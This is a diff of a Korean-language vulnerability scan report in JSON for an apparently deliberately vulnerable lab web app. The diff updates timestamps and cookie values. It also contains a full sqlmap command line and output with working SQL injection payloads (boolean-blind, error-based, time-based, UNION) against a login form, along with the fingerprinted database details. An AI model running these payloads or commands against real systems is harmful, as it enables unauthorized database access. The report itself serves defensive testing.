@@ -1,8 +1,8 @@
 {
-  "scan_id": "SCAN-20260517-175145",
+  "scan_id": "SCAN-20260517-185806",
   "target": "http://15.164.60.79",
   "scanner": "signature-based",
-  "generated_at": "2026-05-17T17:51:45+09:00",
+  "generated_at": "2026-05-17T18:58:06+09:00",
   "summary": {
     "total": 21,
     "severity": {
@@ -103,7 +103,7 @@
       "name": "쿠키 Secure/HttpOnly 미설정",
       "url": "/vulnapp/login.jsp",
       "severity": "medium",
-      "evidence": "Set-Cookie=JSESSIONID=5DAF8A119F715B9713349392B4EA3A89; Path=/vulnapp; HttpOnly, missing=['secure', 'samesite']",
+      "evidence": "Set-Cookie=JSESSIONID=106B03824FD72B4B8716ABD2868EB7C6; Path=/vulnapp; HttpOnly, missing=['secure', 'samesite']",
       "recommendation": "세션 쿠키에 Secure, HttpOnly, SameSite 속성을 적용해야 한다."
     },
     {
@@ -121,7 +121,7 @@
         "sqlmap": {
           "command": "sqlmap -u http://15.164.60.79/vulnapp/login.jsp --batch --level 2 --risk 1 --banner --current-user --current-db --is-dba --dbs --data id=test&pw=test",
           "returncode": 0,
-          "raw_tail": "IONID=52E79865343...A53D662887'). Do you want to use those [Y/n] Y\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 1942=(SELECT (CASE WHEN (1942=1942) THEN 1942 ELSE (SELECT 3481 UNION SELECT 6931) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(1276,CONCAT(0x5c,0x717a787671,(SELECT (ELT(1276=1276,1))),0x71786a7871)) AND 'eTUC'='eTUC&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 4127 FROM (SELECT(SLEEP(5)))gDqM) AND 'OXDt'='OXDt&pw=test\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: id=test' UNION ALL SELECT NULL,CONCAT(0x717a787671,0x4142514164594f4d79596151685377774e527562454b585269536c4c694e726f584d704c6f62524a,0x71786a7871),NULL,NULL-- -&pw=test\n---\n[17:51:44] [INFO] the back-end DBMS is MySQL\n[17:51:44] [INFO] fetching banner\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx 1.28.3, Django, JSP\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: '11.8.6-MariaDB-5 from Ubuntu'\n[17:51:44] [INFO] fetching current user\ncurrent user: 'vulnuser@localhost'\n[17:51:44] [INFO] fetching current database\ncurrent database: 'vuln_db'\n[17:51:44] [INFO] testing if current user is DBA\n[17:51:44] [INFO] fetching current user\n[17:51:44] [WARNING] potential permission problems detected ('command denied')\ncurrent user is DBA: False\n[17:51:44] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] vuln_db\n\n[17:51:44] [INFO] fetched data logged to text files under 'C:\\Users\\EZ\\AppData\\Local\\sqlmap\\output\\15.164.60.79'\n\n[*] ending @ 17:51:44 /2026-05-17/\n\n\n"
+          "raw_tail": "IONID=70441B7F513...2A29E33862'). Do you want to use those [Y/n] Y\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (POST)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)\n    Payload: id=test' AND 1942=(SELECT (CASE WHEN (1942=1942) THEN 1942 ELSE (SELECT 3481 UNION SELECT 6931) END))-- -&pw=test\n\n    Type: error-based\n    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)\n    Payload: id=test' AND EXTRACTVALUE(1276,CONCAT(0x5c,0x717a787671,(SELECT (ELT(1276=1276,1))),0x71786a7871)) AND 'eTUC'='eTUC&pw=test\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=test' AND (SELECT 4127 FROM (SELECT(SLEEP(5)))gDqM) AND 'OXDt'='OXDt&pw=test\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 4 columns\n    Payload: id=test' UNION ALL SELECT NULL,CONCAT(0x717a787671,0x4142514164594f4d79596151685377774e527562454b585269536c4c694e726f584d704c6f62524a,0x71786a7871),NULL,NULL-- -&pw=test\n---\n[18:58:05] [INFO] the back-end DBMS is MySQL\n[18:58:05] [INFO] fetching banner\nweb server operating system: Linux Ubuntu\nweb application technology: Django, Nginx 1.28.3, JSP\nback-end DBMS operating system: Linux Ubuntu\nback-end DBMS: MySQL >= 5.1 (MariaDB fork)\nbanner: '11.8.6-MariaDB-5 from Ubuntu'\n[18:58:05] [INFO] fetching current user\ncurrent user: 'vulnuser@localhost'\n[18:58:05] [INFO] fetching current database\ncurrent database: 'vuln_db'\n[18:58:05] [INFO] testing if current user is DBA\n[18:58:05] [INFO] fetching current user\n[18:58:05] [WARNING] potential permission problems detected ('command denied')\ncurrent user is DBA: False\n[18:58:05] [INFO] fetching database names\navailable databases [2]:\n[*] information_schema\n[*] vuln_db\n\n[18:58:05] [INFO] fetched data logged to text files under 'C:\\Users\\EZ\\AppData\\Local\\sqlmap\\output\\15.164.60.79'\n\n[*] ending @ 18:58:05 /2026-05-17/\n\n\n"
         }
       },
       "recommendation": "PreparedStatement와 바인딩 파라미터를 사용하고 입력값 검증 및 DB 오류 메시지 비노출 처리를 적용해야 한다."
